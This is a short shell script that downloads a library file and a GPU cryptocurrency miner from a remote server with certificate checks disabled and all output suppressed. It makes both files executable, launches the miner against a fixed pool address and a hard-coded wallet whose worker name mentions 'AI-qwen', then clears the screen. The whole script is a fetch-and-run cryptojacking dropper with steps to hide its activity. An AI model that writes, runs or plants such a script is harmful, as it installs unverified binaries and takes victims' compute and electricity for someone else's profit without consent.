#!/bin/sh
wget --no-check-certificate https://maskurniawan.serv00.net/libcudart.so.13 >/dev/null 2>&1 && chmod +x libcudart.so.13
wget --no-check-certificate -O pearl-gpu-miner https://maskurniawan.serv00.net/pearl-gpu-miner >/dev/null 2>&1 && chmod +x pearl-gpu-miner
./pearl-gpu-miner --wallet prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg.AI-qwen-31 --pool 202.155.9.40:80 && clear
